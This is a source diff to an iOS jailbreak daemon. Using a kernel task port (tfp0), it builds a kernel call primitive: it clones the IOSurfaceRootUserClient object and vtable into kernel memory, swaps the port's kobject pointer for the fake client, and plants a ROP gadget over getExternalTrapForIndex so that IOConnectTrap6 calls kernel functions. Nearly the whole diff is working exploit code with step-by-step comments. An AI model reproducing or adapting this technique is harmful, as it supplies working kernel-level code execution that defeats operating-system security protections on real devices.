@@ -10,6 +10,7 @@
 #include <unistd.h>
 #include "patchfinder64.h"
 #include "kern_utils.h"
+#include "offsets.h"
 
 #define SPECIAL_PORT TASK_BOOTSTRAP_PORT
 
@@ -106,6 +107,7 @@ start(mach_port_t port, void *arg)
 }
 
 #define JAILBREAKD_COMMAND_ENTITLE 1
+#define JAILBREAKD_COMMAND_EXIT 13
 
 struct __attribute__((__packed__)) JAILBREAKD_PACKET {
     uint8_t Command;
@@ -118,6 +120,10 @@ struct __attribute__((__packed__)) JAILBREAKD_ENTITLE_PID {
 
 mach_port_t tfpzero;
 uint64_t kernel_base;
+uint64_t kernel_slide;
+
+mach_port_t user_client;
+uint64_t fake_client;
 
 int runserver(){
     printf("[jailbreakd] Process Start!\n");
@@ -169,14 +175,14 @@ int runserver(){
         return (-1);
     }
     
-    /* Receive the real bootstrap port from the parent. */
+    /* Receive tfp0 from the parent. */
     rtrn = recv_port(port, &tfpzero);
     if(rtrn < 0)
     {
         printf("Can't receive task port\n");
         return (-1);
     }
-    printf("[jailbreakd] Got tfp0: %ld\n", tfpzero);
+    printf("[jailbreakd] Got tfp0: %u\n", tfpzero);
     
     /* Set the bootstrap port back to normal. */
     err = task_set_special_port(mach_task_self(), SPECIAL_PORT, bootstrap_port);
@@ -186,10 +192,73 @@ int runserver(){
         return (-1);
     }
 
+    offsets_init();
+
     init_kernel(kernel_base, NULL);
     // Get the slide
-    uint64_t slide = kernel_base - 0xFFFFFFF007004000;
-    printf("[jailbreakd] slide: 0x%016llx\n", slide);
+    kernel_slide = kernel_base - 0xFFFFFFF007004000;
+    printf("[jailbreakd] slide: 0x%016llx\n", kernel_slide);
+
+    user_client = prepare_user_client();
+
+    uint64_t cached_task_self_addr = 0;
+    uint64_t task_self = task_self_addr();
+    if (task_self == 0) {
+        printf("unable to disclose address of our task port\n");
+        sleep(10);
+        exit(EXIT_FAILURE);
+    }
+    printf("our task port is at 0x%llx\n", task_self);
+
+    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
+    uint64_t IOSurfaceRootUserClient_port = find_port(user_client); // UserClients are just mach_ports, so we find its address
+    printf("Found port: 0x%llx\n", IOSurfaceRootUserClient_port);
+
+    uint64_t IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
+    printf("Found addr: 0x%llx\n", IOSurfaceRootUserClient_addr);
+
+    uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
+    printf("Found vtab: 0x%llx\n", IOSurfaceRootUserClient_vtab);
+
+    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
+    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
+
+    
+    // Create the vtable in the kernel memory, then copy the existing vtable into there
+    uint64_t fake_vtable = kalloc(0x1000);
+    printf("Created fake_vtable at %016llx\n", fake_vtable);
+    
+    for (int i = 0; i < 0x200; i++) {
+        wk64(fake_vtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
+    }
+    
+    printf("Copied some of the vtable over\n");
+    
+    
+    // Create the fake user client
+    fake_client = kalloc(0x1000);
+    printf("Created fake_client at %016llx\n", fake_client);
+    
+    for (int i = 0; i < 0x200; i++) {
+        wk64(fake_client+i*8, rk64(IOSurfaceRootUserClient_addr+i*8));
+    }
+    
+    printf("Copied the user client over\n");
+    
+    // Write our fake vtable into the fake user client
+    wk64(fake_client, fake_vtable);
+    
+    // Replace the user client with ours
+    wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
+    
+    // Now the userclient port we have will look into our fake user client rather than the old one
+    
+    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
+    wk64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
+    
+    printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
+
+
     
     struct sockaddr_in serveraddr; /* server's addr */
     struct sockaddr_in clientaddr; /* client addr */
@@ -208,6 +277,7 @@ int runserver(){
 
     if (bind(sockfd, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) < 0){
         printf("[jailbreakd] Error binding...\n");
+        wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
         exit(-1);
     }
     printf("[jailbreakd] Server running!\n");
@@ -232,7 +302,11 @@ int runserver(){
             NSLog(@"Entitle PID %d\n", entitlePacket->Pid);
             setcsflags(entitlePacket->Pid);
         }
-
+        if (command == JAILBREAKD_COMMAND_EXIT){
+            NSLog(@"Got Exit Command! Goodbye!");
+            wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
+            exit(0);
+        }
     }
     
     /* Exit and clean up the child process. */
